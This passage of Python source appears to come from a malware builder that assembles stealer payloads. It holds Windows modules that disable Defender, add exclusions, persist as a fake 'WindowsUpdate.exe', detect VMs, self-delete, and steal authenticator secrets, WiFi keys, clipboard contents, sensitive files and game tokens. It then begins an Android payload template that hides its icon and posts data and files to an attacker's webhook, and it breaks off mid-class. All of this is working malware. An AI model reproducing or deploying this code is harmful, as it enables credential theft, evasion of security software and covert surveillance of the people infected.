            "Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisablePrivacyMode $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableArchiveScanning $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableScriptScanning $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -SubmitSamplesConsent 2 -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -MAPSReporting 0 -Force -ErrorAction SilentlyContinue",
        ]
        for cmd in ps_commands:
            try:
                subprocess.run(["powershell", "-Command", cmd],
                               capture_output=True, timeout=8,
                               creationflags=0x08000000)
            except: pass
        dlog("disable_defender: completed")
        path = os.path.join(OUT, "defender_disabled.txt")
        with open(path, "w") as f: f.write("Windows Defender has been disabled via registry and PowerShell.\\n")
        record_result("Defender Status", path)
    except Exception as e:
        dlog(f"disable_defender FAIL: {e}")
''',
    "add_exclusion": '''
def add_to_defender_exclusion():
    try:
        dlog("add_exclusion: starting...")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        exe_dir = os.path.dirname(current_exe)
        paths_to_exclude = [current_exe, exe_dir, os.environ.get("TEMP", "C:\\\\Windows\\\\Temp")]
        for p in paths_to_exclude:
            try:
                cmd = f'Add-MpPreference -ExclusionPath "{p}" -Force -ErrorAction SilentlyContinue'
                subprocess.run(["powershell", "-Command", cmd],
                               capture_output=True, timeout=8,
                               creationflags=0x08000000)
                dlog(f"add_exclusion: added path {p}")
            except Exception as e2:
                dlog(f"add_exclusion: path {p} failed: {e2}")
        import winreg
        try:
            excl_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(excl_key, current_exe, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(excl_key)
            dlog("add_exclusion: registry exclusion added")
        except: pass
        dlog("add_exclusion: completed")
        path = os.path.join(OUT, "exclusion_added.txt")
        with open(path, "w") as f:
            f.write(f"Added to Defender exclusions:\\n{current_exe}\\n{exe_dir}\\n")
        record_result("Exclusion Status", path)
    except Exception as e:
        dlog(f"add_exclusion FAIL: {e}")
''',
    "startup": '''
def add_to_startup():
    try:
        dlog("startup: starting...")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        startup_folder = os.path.join(os.environ.get("APPDATA",""),
            "Microsoft","Windows","Start Menu","Programs","Startup")
        dest_name = "WindowsUpdate.exe"
        dest_path = os.path.join(startup_folder, dest_name)
        try:
            if current_exe != dest_path:
                shutil.copy2(current_exe, dest_path)
            dlog(f"startup: copied to {dest_path}")
        except Exception as e:
            dlog(f"startup: folder copy failed: {e}")
        import winreg
        try:
            run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(run_key, "WindowsUpdate", 0, winreg.REG_SZ, dest_path)
            winreg.CloseKey(run_key)
            dlog("startup: HKCU Run key added")
        except Exception as e:
            dlog(f"startup: HKCU registry failed: {e}")
        try:
            run_key_lm = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(run_key_lm, "WindowsUpdate", 0, winreg.REG_SZ, dest_path)
            winreg.CloseKey(run_key_lm)
            dlog("startup: HKLM Run key added")
        except Exception as e:
            dlog(f"startup: HKLM registry failed: {e}")
        dlog("startup: completed")
        path = os.path.join(OUT, "startup_status.txt")
        with open(path, "w") as f:
            f.write(f"Persistence installed:\\nStartup Folder: {dest_path}\\nRegistry HKCU + HKLM Run keys set.\\n")
        record_result("Startup Status", path)
    except Exception as e:
        dlog(f"startup FAIL: {e}")
''',
    "authenticator": r'''
def scrape_authenticators():
    dlog("authenticator: full sweep with i18n fallback...")
    auth_data = []

    try:
        import winreg
        for key_path in [
            r"SOFTWARE\Google\Google Authenticator",
            r"SOFTWARE\Google\Google Authenticator\Accounts",
        ]:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                i = 0
                while True:
                    try:
                        val_name, val_data, _ = winreg.EnumValue(key, i)
                        auth_data.append(f"[GoogleAuth/Reg] {val_name}: {val_data}")
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except:
                pass
    except:
        pass

    auth_ext_hits = []

    for bname, ua in get_chromium_browsers():
        for prof in os.listdir(ua):
            if not (prof.startswith("Default") or prof.startswith("Profile")):
                continue

            ext_root = os.path.join(ua, prof, "Extensions")
            if not os.path.isdir(ext_root):
                continue

            for ext_id in os.listdir(ext_root):
                ext_dir = os.path.join(ext_root, ext_id)
                if not os.path.isdir(ext_dir):
                    continue

                matched = False
                version_dirs = sorted(os.listdir(ext_dir), reverse=True)
                manifest = None
                for vd in version_dirs:
                    mf = os.path.join(ext_dir, vd, "manifest.json")
                    if os.path.isfile(mf):
                        manifest = mf
                        break

                if manifest:
                    try:
                        with open(manifest, "r", encoding="utf-8", errors="ignore") as mf:
                            mani = json.load(mf)
                            name_raw = mani.get("name", "")
                            short_name = mani.get("short_name", "")

                            if name_raw.startswith("__MSG_") and "_locales" in os.listdir(ext_dir):
                                locale_dir = os.path.join(ext_dir, version_dirs[0], "_locales")
                                default_msg = None
                                for lang in ["en", "en_US"]:
                                    messages_path = os.path.join(locale_dir, lang, "messages.json")
                                    if os.path.isfile(messages_path):
                                        try:
                                            with open(messages_path, "r", encoding="utf-8") as mf2:
                                                msgs = json.load(mf2)
                                                key = name_raw.replace("__MSG_", "").replace("__", "")
                                                default_msg = msgs.get(key, {}).get("message", "")
                                                if default_msg:
                                                    break
                                        except:
                                            pass
                                name_raw = default_msg if default_msg else name_raw

                            check_name = (name_raw + " " + short_name).lower()
                            if any(kw in check_name for kw in (
                                "authenticator", "authy", "2fa", "totp",
                                "otp", "two-factor", "two factor", "google authenticator",
                                "microsoft authenticator", "lastpass authenticator", "auth",
                            )):
                                matched = True
                    except:
                        pass

                if not matched:
                    storage_path = os.path.join(ua, prof, "Local Extension Settings", ext_id)
                    if os.path.isdir(storage_path):
                        for sf_root, _, sf_files in os.walk(storage_path):
                            for sf in sf_files:
                                if sf.endswith(".ldb") or sf.endswith(".log"):
                                    try:
                                        with open(os.path.join(sf_root, sf), "r", errors="ignore") as lf:
                                            content = lf.read()
                                            if re.search(r"(?:otpauth://totp|secret=[A-Z2-7]{16,}|authenticator|totp|2fa)", content, re.I):
                                                matched = True
                                                dlog(f"authenticator: LevelDB fallback match for {ext_id}")
                                                break
                                    except:
                                        pass
                            if matched:
                                break

                if matched:
                    auth_ext_hits.append((bname, prof, ext_id))
                    dlog(f"authenticator: MATCHED [{bname}/{prof}] {ext_id}")

    for bname, prof, ext_id in auth_ext_hits:
        ua = None
        for bn, up in get_chromium_browsers():
            if bn == bname:
                ua = up
                break
        if not ua:
            continue

        storage_src = os.path.join(ua, prof, "Local Extension Settings", ext_id)
        if os.path.isdir(storage_src):
            dest = os.path.join(OUT, "Auth_Extensions", f"{bname}_{prof}_{ext_id}")
            try:
                shutil.copytree(storage_src, dest, dirs_exist_ok=True)
                auth_data.append(f"[BrowserExt/{bname}/{prof}] {ext_id}: storage captured")
                record_result("Auth Ext Storage", dest)
            except Exception as e:
                dlog(f"authenticator: copy fail {ext_id}: {e}")

        sync_src = os.path.join(ua, prof, "Sync Extension Settings", ext_id)
        if os.path.isdir(sync_src):
            dest_sync = os.path.join(OUT, "Auth_Extensions", f"{bname}_{prof}_{ext_id}_sync")
            try:
                shutil.copytree(sync_src, dest_sync, dirs_exist_ok=True)
                auth_data.append(f"[BrowserExt/{bname}/{prof}] {ext_id}: sync storage captured")
                record_result("Auth Ext Sync", dest_sync)
            except:
                pass

        indexed_src = os.path.join(ua, prof, "IndexedDB", f"chrome-extension_{ext_id}_0.indexeddb.leveldb")
        if os.path.isdir(indexed_src):
            dest_idb = os.path.join(OUT, "Auth_Extensions", f"{bname}_{prof}_{ext_id}_indexeddb")
            try:
                shutil.copytree(indexed_src, dest_idb, dirs_exist_ok=True)
                auth_data.append(f"[BrowserExt/{bname}/{prof}] {ext_id}: IndexedDB captured")
                record_result("Auth Ext IDB", dest_idb)
            except:
                pass

    for wp in [
        os.path.join(os.environ.get("APPDATA",""), "WinAuth"),
        os.path.join(os.environ.get("LOCALAPPDATA",""), "WinAuth"),
        os.path.join(os.environ.get("USERPROFILE",""), "Documents", "WinAuth"),
    ]:
        if os.path.exists(wp):
            for root, _, files in os.walk(wp):
                for f in files:
                    if f.endswith(".xml"):
                        try:
                            fpath = os.path.join(root, f)
                            with open(fpath, "r", encoding="utf-8", errors="ignore") as xf:
                                content = xf.read()
                                for m in re.findall(r'<secret[^>]*>([^<]+)</secret>', content, re.I):
                                    auth_data.append(f"[WinAuth] {f}: secret={m}")
                                for m in re.findall(r'Secret="([^"]+)"', content):
                                    auth_data.append(f"[WinAuth] {f}: Secret={m}")
                        except:
                            pass

    for ap in [
        os.path.join(os.environ.get("APPDATA",""), "Authy Desktop"),
        os.path.join(os.environ.get("LOCALAPPDATA",""), "authy"),
    ]:
        if os.path.exists(ap):
            try:
                dest = os.path.join(OUT, "authy_data")
                shutil.copytree(ap, dest, dirs_exist_ok=True)
                auth_data.append("[Authy] Full data copied")
                record_result("Authy Data", dest)
            except:
                pass

    import glob as g
    for p in g.glob(os.path.join(os.environ.get("LOCALAPPDATA",""), "Packages", "Microsoft.MicrosoftAuthenticator_*")):
        try:
            dest = os.path.join(OUT, "ms_authenticator")
            shutil.copytree(p, dest, dirs_exist_ok=True)
            auth_data.append("[MS Auth] Data copied")
            record_result("MS Authenticator", dest)
        except:
            pass

    path = os.path.join(OUT, "authenticator_secrets.txt")
    uniq_data = list(set(auth_data))
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(uniq_data) if uniq_data else "No authenticator data found.")
    record_result("Authenticator Data", path)
    if uniq_data:
        send_text_now("\U0001f510 Auth Secrets", "\n".join(uniq_data[:15]))
    dlog(f"authenticator: {len(uniq_data)} entries, {len(auth_ext_hits)} extensions")
''',

    "wifi": r'''
def scrape_wifi():
    try:
        dlog("wifi: starting...")
        profiles_data = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                        capture_output=True, text=True,
                                        creationflags=0x08000000).stdout
        profiles = re.findall(r":\s*(.+)$", profiles_data, re.MULTILINE)
        wifi_entries = []
        for profile in profiles:
            profile = profile.strip()
            if profile:
                pw_data = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],
                                         capture_output=True, text=True,
                                         creationflags=0x08000000).stdout
                pw_match = re.search(r"Key Content\s*:\s*(.+)", pw_data)
                password = pw_match.group(1).strip() if pw_match else "(open)"
                wifi_entries.append(f"{profile}: {password}")
        path = os.path.join(OUT, "wifi_passwords.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(wifi_entries) if wifi_entries else "No wifi profiles found.")
        record_result("Wifi Passwords", path)
        if wifi_entries:
            send_text_now("\U0001f4f6 WiFi Passwords", "\n".join(wifi_entries[:15]))
        dlog(f"wifi: {len(wifi_entries)} profiles extracted")
    except Exception as e:
        dlog(f"wifi FAIL: {e}")
''',
    "clipboard": '''
def scrape_clipboard():
    try:
        dlog("clipboard: starting...")
        result = subprocess.run(["powershell", "-Command", "Get-Clipboard"],
                               capture_output=True, text=True,
                               timeout=5, creationflags=0x08000000)
        content = result.stdout.strip()
        if content and len(content) > 0:
            path = os.path.join(OUT, "clipboard.txt")
            with open(path, "w", encoding="utf-8", errors="replace") as f:
                f.write(content)
            record_result("Clipboard", path)
            send_text_now("\\U0001f4cb Clipboard", content[:1900])
            dlog("clipboard: captured")
    except:
        pass
''',
    "common_files": '''
def scrape_common_files():
    try:
        dlog("common_files: starting...")
        search_dirs = [
            os.path.join(os.environ.get("USERPROFILE",""), "Desktop"),
            os.path.join(os.environ.get("USERPROFILE",""), "Documents"),
            os.path.join(os.environ.get("USERPROFILE",""), "Downloads"),
        ]
        sensitive_keywords = [
            "password", "secret", "wallet", "bitcoin", "ethereum", "private key",
            "recovery", "seed", "mnemonic", "backup", "credential", "login",
            "bank", "account", "2fa", "token", "api key", "confidential"
        ]
        sensitive_extensions = [
            ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
            ".kdbx", ".rdp", ".ovpn", ".key", ".pem", ".ppk",
            ".json", ".xml", ".cfg", ".ini", ".env", ".log"
        ]
        found_files = []
        dest_dir = os.path.join(OUT, "CommonFiles")
        os.makedirs(dest_dir, exist_ok=True)
        for search_dir in search_dirs:
            if not os.path.exists(search_dir): continue
            for root, _, files in os.walk(search_dir):
                for f in files:
                    fpath = os.path.join(root, f)
                    fname_lower = f.lower()
                    matched = False
                    for kw in sensitive_keywords:
                        if kw in fname_lower:
                            matched = True
                            break
                    if not matched:
                        for ext in sensitive_extensions:
                            if fname_lower.endswith(ext):
                                matched = True
                                break
                    if matched and not fname_lower.endswith(".lnk"):
                        try:
                            if os.path.getsize(fpath) < 10 * 1024 * 1024:
                                shutil.copy2(fpath, os.path.join(dest_dir, f))
                                found_files.append(f)
                        except: pass
        if found_files:
            zp = os.path.join(OUT, "common_files.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", dest_dir)
            record_result("Common Files", zp)
        dlog(f"common_files: {len(found_files)} files collected")
    except Exception as e:
        dlog(f"common_files FAIL: {e}")
''',
    "games": r'''
def scrape_games():
    dlog("games: starting multi-drive sweep...")
    game_data = []
    steam_games_found = []

    def get_all_drives():
        drives = []
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            d = f"{letter}:\\"
            if os.path.exists(d):
                drives.append(d)
        return drives

    try:
        all_drives = get_all_drives()
        dlog(f"games: drives detected: {all_drives}")
    except Exception as e:
        all_drives = ["C:\\"]
        dlog(f"games: drive enum failed, falling back to C: - {e}")

    try:
        mc_dir = os.path.join(os.environ.get("APPDATA",""), ".minecraft")
        if os.path.exists(mc_dir):
            for fname in ["launcher_accounts.json", "launcher_profiles.json"]:
                fpath = os.path.join(mc_dir, fname)
                if os.path.isfile(fpath):
                    try:
                        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                            game_data.append(f"[Minecraft/{fname}]:\n{f.read()[:2000]}")
                    except:
                        pass
            lp = os.path.join(mc_dir, "launcher_profiles.json")
            if os.path.isfile(lp):
                try:
                    with open(lp, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        for match in re.findall(r'"accessToken"\s*:\s*"([^"]+)"', content):
                            game_data.append(f"[Minecraft/Token] accessToken: {match}")
                except:
                    pass
            for launcher_name in ["MultiMC", "PrismLauncher"]:
                launcher_dir = os.path.join(os.environ.get("APPDATA",""), launcher_name)
                if os.path.exists(launcher_dir):
                    accounts_file = os.path.join(launcher_dir, "accounts.json")
                    if os.path.isfile(accounts_file):
                        try:
                            with open(accounts_file, "r", encoding="utf-8", errors="ignore") as f:
                                game_data.append(f"[{launcher_name}/accounts.json]:\n{f.read()[:2000]}")
                        except:
                            pass
    except Exception as e:
        dlog(f"games: Minecraft section failed: {e}")

    try:
        steam_install_dirs = []
        for drive in all_drives:
            for sub in ["Program Files (x86)\\Steam", "Program Files\\Steam", "Steam"]:
                candidate = os.path.join(drive, sub)
                if os.path.isdir(candidate):
                    steam_install_dirs.append(candidate)

        steam_libraries = []
        for steam_dir in steam_install_dirs:
            vdf_path = os.path.join(steam_dir, "steamapps", "libraryfolders.vdf")
            if os.path.isfile(vdf_path):
                try:
                    with open(vdf_path, "r", encoding="utf-8", errors="ignore") as vdf:
                        content = vdf.read()
                        for match in re.findall(r'"path"\s+"([^"]+)"', content):
                            lib = os.path.normpath(match.replace("\\\\", "\\"))
                            steam_libraries.append(lib)
                        steam_libraries.append(os.path.join(steam_dir, "steamapps"))
                except:
                    steam_libraries.append(os.path.join(steam_dir, "steamapps"))
            else:
                steam_libraries.append(os.path.join(steam_dir, "steamapps"))

        for drive in all_drives:
            try:
                for entry in os.listdir(drive):
                    full = os.path.join(drive, entry)
                    if os.path.isdir(full) and "steam" in entry.lower():
                        sa = os.path.join(full, "steamapps")
                        if os.path.isdir(sa):
                            steam_libraries.append(sa)
            except:
                pass

        steam_libraries = list(set(steam_libraries))
        dlog(f"games: steam libraries: {steam_libraries}")

        for lib in steam_libraries:
            common_dir = os.path.join(lib, "common")
            if os.path.isdir(common_dir):
                try:
                    for game_name in os.listdir(common_dir):
                        game_path = os.path.join(common_dir, game_name)
                        if os.path.isdir(game_path):
                            steam_games_found.append(f"[Steam] {game_name} => {game_path}")
                            for root, _, files in os.walk(game_path):
                                for f in files:
                                    if f.lower().endswith((".cfg", ".ini", ".json", ".xml", ".txt")):
                                        fpath = os.path.join(root, f)
                                        try:
                                            if os.path.getsize(fpath) < 5 * 1024 * 1024:
                                                with open(fpath, "r", encoding="utf-8", errors="ignore") as gf:
                                                    content = gf.read()[:2000]
                                                    if any(kw in content.lower() for kw in (
                                                        "token", "password", "secret", "login", "auth",
                                                        "steamid", "username", "credential"
                                                    )):
                                                        game_data.append(f"[Steam/{game_name}/{f}]:\n{content}")
                                        except:
                                            pass
                except Exception as e:
                    dlog(f"games: steam common dir error {common_dir}: {e}")
    except Exception as e:
        dlog(f"games: Steam section failed: {e}")

    try:
        for drive in all_drives:
            try:
                for root, dirs, _ in os.walk(drive):
                    depth = root.replace(drive, "").count(os.sep)
                    if depth > 3:
                        dirs.clear()
                        continue
                    for d in dirs:
                        if d.lower() == "epic games":
                            epic_path = os.path.join(root, d)
                            game_data.append(f"[EpicGames/Found] {epic_path}")
                            dlog(f"games: found Epic Games at {epic_path}")
                            try:
                                for sub_root, sub_dirs, sub_files in os.walk(epic_path):
                                    sub_depth = sub_root.replace(epic_path, "").count(os.sep)
                                    if sub_depth > 4:
                                        sub_dirs.clear()
                                        continue
                                    for sf in sub_files:
                                        if sf.lower().endswith((".ini", ".cfg", ".json", ".xml")):
                                            sfpath = os.path.join(sub_root, sf)
                                            try:
                                                if os.path.getsize(sfpath) < 2 * 1024 * 1024:
                                                    with open(sfpath, "r", encoding="utf-8", errors="ignore") as ef:
                                                        game_data.append(f"[EpicGames/{os.path.relpath(sfpath, epic_path)}]:\n{ef.read()[:2000]}")
                                            except:
                                                pass
                            except:
                                pass
            except:
                pass

        epic_config = os.path.join(
            os.environ.get("LOCALAPPDATA",""),
            "EpicGamesLauncher", "Saved", "Config", "Windows"
        )
        if os.path.isdir(epic_config):
            for fname in ["GameUserSettings.ini", "Engine.ini"]:
                fpath = os.path.join(epic_config, fname)
                if os.path.isfile(fpath):
                    try:
                        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                            game_data.append(f"[EpicGames/Config/{fname}]:\n{f.read()[:2000]}")
                    except:
                        pass
            try:
                dest = os.path.join(OUT, "EpicGames_Config")
                shutil.copytree(epic_config, dest, dirs_exist_ok=True)
                record_result("Epic Games Config", dest)
            except:
                pass
    except Exception as e:
        dlog(f"games: Epic section failed: {e}")

    try:
        for drive in all_drives:
            xbox_path = os.path.join(drive, "XboxGames")
            if os.path.isdir(xbox_path):
                game_data.append(f"[Xbox/Found] {xbox_path}")
                dlog(f"games: found XboxGames at {xbox_path}")
                try:
                    for game_name in os.listdir(xbox_path):
                        game_full = os.path.join(xbox_path, game_name)
                        if os.path.isdir(game_full):
                            game_data.append(f"[Xbox/Game] {game_name} => {game_full}")
                            for xroot, _, xfiles in os.walk(game_full):
                                xdepth = xroot.replace(game_full, "").count(os.sep)
                                if xdepth > 3:
                                    break
                                for xf in xfiles:
                                    if xf.lower().endswith((".ini", ".cfg", ".json", ".xml", ".txt")):
                                        xfpath = os.path.join(xroot, xf)
                                        try:
                                            if os.path.getsize(xfpath) < 2 * 1024 * 1024:
                                                with open(xfpath, "r", encoding="utf-8", errors="ignore") as xff:
                                                    content = xff.read()[:2000]
                                                    if any(kw in content.lower() for kw in (
                                                        "token", "xbox", "microsoft", "login", "credential", "gamertag"
                                                    )):
                                                        game_data.append(f"[Xbox/{game_name}/{xf}]:\n{content}")
                                        except:
                                            pass
                except:
                    pass
    except Exception as e:
        dlog(f"games: Xbox section failed: {e}")

    if steam_games_found:
        game_data.extend(steam_games_found)

    path = os.path.join(OUT, "games_data.txt")
    uniq_game = list(set(game_data))
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n\n".join(uniq_game) if uniq_game else "No game data found on this machine.")
    record_result("Games Data", path)
    preview_lines = uniq_game[:10] if uniq_game else ["No games, launchers, or sessions found."]
    send_text_now("\U0001f3ae Games Harvest", "\n".join(preview_lines))

    dlog(f"games: {len(uniq_game)} entries, {len(steam_games_found)} steam games, {len(steam_libraries) if 'steam_libraries' in dir() else 0} steam libs")
''',

    "anti_vm": '''
def check_anti_vm_debug():
    try:
        dlog("anti_vm: checking...")
        vm_indicators = []
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                vm_indicators.append("debugger_present")
        except: pass
        vm_registry_keys = [
            r"SOFTWARE\\VMware, Inc.\\VMware Tools",
            r"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            r"HARDWARE\\ACPI\\DSDT\\VBOX__",
            r"HARDWARE\\ACPI\\DSDT\\VMwareVirtualPC",
            r"SYSTEM\\ControlSet001\\Services\\vmbus",
            r"SYSTEM\\ControlSet001\\Services\\VBoxSF",
        ]
        import winreg
        for key_path in vm_registry_keys:
            try:
                hive = winreg.HKEY_LOCAL_MACHINE
                winreg.OpenKey(hive, key_path)
                last_part = key_path.split("\\\\")[-1]
                vm_indicators.append(f"reg:{last_part}")
                winreg.CloseKey(hive)
            except: pass
        vm_processes = [
            "vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
            "VBoxService.exe","VBoxTray.exe","xenservice.exe",
            "vmsrvc.exe","vmusrvc.exe","prl_tools.exe"
        ]
        try:
            result = subprocess.run(["tasklist"], capture_output=True, text=True,
                                    creationflags=0x08000000)
            for proc in vm_processes:
                if proc.lower() in result.stdout.lower():
                    vm_indicators.append(f"proc:{proc}")
        except: pass
        try:
            user32 = ctypes.windll.user32
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            if w <= 1024 and h <= 768:
                vm_indicators.append(f"small_screen:{w}x{h}")
        except: pass
        if vm_indicators:
            dlog(f"anti_vm: DETECTED -- {', '.join(vm_indicators)} -- exiting silently")
            sys.exit(0)
        else:
            dlog("anti_vm: clean -- proceeding")
    except Exception as e:
        dlog(f"anti_vm check FAIL (proceeding anyway): {e}")
''',
    "self_destruct": '''
def self_destruct():
    try:
        dlog("self_destruct: starting...")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else None
        if not current_exe or not os.path.exists(current_exe):
            dlog("self_destruct: not a frozen exe, skipping")
            return
        bat_path = os.path.join(TEMP, "cleanup.bat")
        bat_content = "@echo off\\n:loop\\ndel /f \\"" + current_exe + "\\"\\nif exist \\"" + current_exe + "\\" (\\n    timeout /t 2 /nobreak >nul\\n    goto loop\\n)\\ndel /f \\"%~f0\\"\\n"
        with open(bat_path, "w") as f:
            f.write(bat_content)
        subprocess.Popen(["cmd", "/c", bat_path],
                        creationflags=0x08000000 | 0x00000008,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        dlog("self_destruct: cleanup.bat launched")
    except Exception as e:
        dlog(f"self_destruct FAIL: {e}")
''',
    "anti_spam": '''
def check_anti_spam_mutex():
    try:
        import ctypes
        import ctypes.wintypes
        mutex_name = MUTEX_NAME
        handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        if ctypes.windll.kernel32.GetLastError() == 183:
            dlog("anti_spam: another instance is running, exiting")
            sys.exit(0)
        dlog(f"anti_spam: mutex acquired ({mutex_name})")
    except Exception as e:
        dlog(f"anti_spam check FAIL (proceeding anyway): {e}")
''',
}


ANDROID_MAIN_TEMPLATE = Template(r'''package com.${package_name}.payload;

import android.app.Activity;
import android.os.Bundle;
import android.os.AsyncTask;
import android.content.Context;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiInfo;
import android.provider.Settings;
import android.os.Build;
import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.content.Intent;
import android.hardware.Camera;
import android.view.SurfaceView;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.zip.*;
import javax.net.ssl.HttpsURLConnection;

public class MainActivity extends Activity {
    
    private static final String WEBHOOK = "${webhook}";
    private static final String TAG = "PayloadService";
    private static final String PING_TYPE = "${ping_type}";
    private Handler handler = new Handler(Looper.getMainLooper());
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Programmatic layout
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        TextView tv = new TextView(this);
        tv.setText("Loading...");
        tv.setTextSize(18);
        layout.addView(tv);
        setContentView(layout);
        
        hideAppIcon();
        
        // Request necessary runtime permissions
        requestRequiredPermissions();
    }
    
    private void requestRequiredPermissions() {
        java.util.ArrayList<String> needed = new java.util.ArrayList<>();
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.CAMERA);
        if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        
        if (!needed.isEmpty()) {
            requestPermissions(needed.toArray(new String[0]), 1001);
        } else {
            new PayloadTask().execute();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Start the payload after permissions are handled (even if denied)
        new PayloadTask().execute();
    }
    
    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            log("Failed to hide icon: " + e.getMessage());
        }
    }
    
    private void log(String msg) {
        Log.d(TAG, msg);
    }
    
    private void sendToWebhook(String content) {
        try {
            URL url = new URL(WEBHOOK);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            String prefix = "";
            if (PING_TYPE.equals("Everyone")) prefix = "@everyone ";
            else if (PING_TYPE.equals("Here")) prefix = "@here ";
            
            String json = "{\"content\":\"" + prefix + escapeJson(content) + "\"}";
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            log("Webhook send failed: " + e.getMessage());
        }
    }
    
    private void sendFileToWebhook(String filename, byte[] data) {
        try {
            String boundary = "----WebKitFormBoundary" + UUID.randomUUID().toString();
            URL url = new URL(WEBHOOK);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            
            OutputStream os = conn.getOutputStream();
            String header = "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n" +
                "Content-Type: application/octet-stream\r\n\r\n";
            os.write(header.getBytes());
            os.write(data);
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            log("File send failed: " + e.getMessage());
        }
    }
    
    private String escapeJson(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\t", "\\t");
    }
    
    private String getIMEI() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                return tm.getDeviceId();
            }
        } catch (Exception e) { }
        return "N/A";
    }
    
    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }
    
    private class PayloadTask extends AsyncTask<Void, String, Void> {
        
        private File outDir;
        
        @Override
        protected void onPreExecute() {
            // Robust storage setup — never crash on null
            try {
                File external = getExternalFilesDir(null);
                if (external != null) {
                    outDir = new File(external, "payload_" + System.currentTimeMillis());
                } else {
                    // Fallback to internal storage
                    outDir = new File(getFilesDir(), "payload_" + System.currentTimeMillis());
                }
                if (!outDir.exists()) {
                    outDir.mkdirs();
                }
            } catch (Exception e) {
                // Last resort — use cache directory
                outDir = new File(getCacheDir(), "payload_" + System.currentTimeMillis());
                outDir.mkdirs();
            }
        }
        
        @Override
